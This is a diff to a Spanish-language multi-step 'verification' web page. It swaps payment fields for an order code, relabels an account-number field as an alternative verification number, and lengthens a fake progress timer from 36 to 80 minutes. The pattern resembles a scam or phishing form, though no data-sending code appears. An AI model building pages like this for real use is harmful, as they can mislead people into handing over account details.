@@ -18,13 +18,13 @@
             height: 20px;
             background-color: green;
             margin-top: 20px;
-            transition: width 1s linear; /* Transición suave */
+            transition: width 1s linear;
         }
     </style>
 </head>
 <body>
 
-    <h2>Verificación de Pagos</h2>
+    <h2>Verificación de trámite regularizado</h2>
 
     <!-- Paso 1: Ingresar código -->
     <div id="step1">
@@ -35,15 +35,14 @@
 
     <!-- Paso 2: Ingresar datos de pago -->
     <div id="step2">
-        <p>Ingrese la fecha y los importes:</p>
-        <input type="text" placeholder="Fecha">
-        <input type="text" placeholder="Importe">
+        <p>Ingrese el Código de pedido:</p>
+        <input type="text" placeholder="Código de pedido">
         <button onclick="goToStep3()">Continuar</button>
     </div>
 
     <!-- Paso 3: Ingresar número de cuenta -->
     <div id="step3">
-        <p>Ingrese los datos de pago:</p>
+        <p>Ingrese el Número de Verificación Alternativa:</p>
         <input type="text" placeholder="Número de cuenta">
         <button onclick="showQR()">Continuar</button>
     </div>
@@ -95,15 +94,14 @@
             document.getElementById("loading-section").style.display = "block";
 
             let loadingBar = document.getElementById("loading-bar");
-            let totalTime = 36 * 60; // 36 minutos en segundos
+            let totalTime = 80 * 60; // 1 hora 20 minutos en segundos
             let timeLeft = totalTime;
 
             let interval = setInterval(() => {
                 timeLeft--;
 
-                // Calcula el progreso en porcentaje
                 let progress = ((totalTime - timeLeft) / totalTime) * 100;
-                loadingBar.style.width = progress + "%"; 
+                loadingBar.style.width = progress + "%";
 
                 if (timeLeft <= 0) {
                     clearInterval(interval);
